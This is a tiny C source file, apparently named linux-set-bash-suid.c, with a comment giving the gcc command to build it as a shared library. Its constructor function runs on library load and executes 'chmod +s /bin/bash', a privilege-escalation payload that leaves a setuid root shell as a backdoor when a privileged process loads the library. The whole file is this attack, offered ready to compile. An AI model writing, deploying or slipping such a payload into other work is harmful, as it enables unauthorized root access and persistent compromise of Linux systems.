#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor)); 

void inject() {
	system("chmod +s /bin/bash");
	system("echo :3");
}


// --- TO COMPILE ---
// gcc -fPIC -shared linux-set-bash-suid.c -o poop.so
